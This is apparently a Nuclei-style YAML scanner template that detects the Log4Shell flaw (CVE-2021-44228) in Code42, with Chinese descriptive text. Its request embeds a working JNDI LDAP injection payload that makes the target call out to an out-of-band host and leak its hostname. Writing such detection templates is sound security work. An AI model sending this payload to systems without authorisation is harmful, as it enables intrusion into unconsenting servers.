id: code42-log4j-rce

info:
  name: Apache Code42 - 远程代码执行漏洞
  author: Adam Crosser
  severity: critical
  description: |
    该模板用于检测 Apache Code42 - 远程代码执行漏洞。此类问题通常源于受影响组件在日志记录过程中解析可控 JNDI 表达式，可能触发外带交互或远程代码执行。模板主要向 `/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{变量}}${:-{变量}}.${hostName}.username.{变量}...` 等路径发送探测请求，并根据OAST/DNS/HTTP 外带交互、响应状态或关键字回显确认漏洞是否存在。
  impact: |
    - 攻击者可能通过 Log4j/JNDI 解析链触发远程类加载或外带交互，在受影响服务进程权限下执行代码。
    - 成功利用后可能导致服务器被接管、敏感配置和凭据泄露，并成为进一步横向移动的入口。
  remediation: |
    - 升级受影响产品和 Log4j 组件到厂商修复版本，移除或替换存在风险的 Log4j 1.x/2.x 依赖。
    - 在无法立即升级时，禁用 JNDI 远程加载相关能力，并限制服务器对 LDAP/RMI/DNS 等外联通道的访问。
    - 复核应用日志、异常外联、进程启动和新增文件，确认是否已发生利用并轮换可能暴露的凭据。
  reference:
    - https://support.code42.com/Terms_and_conditions/Code42_customer_support_resources/Code42_response_to_industry_security_incidents
    - https://logging.apache.org/log4j/2.x/security.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77,CWE-502
  metadata:
    max-request: 1
  tags: cve,cve2021,jndi,log4j,rce,oast,code42,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'

http:
  - method: GET
    path:
      - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost'

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'

    extractors:
      - type: kval
        kval:
          - interactsh_ip

      - type: regex
        part: interactsh_request
        group: 2
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'

      - type: regex
        part: interactsh_request
        group: 1
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
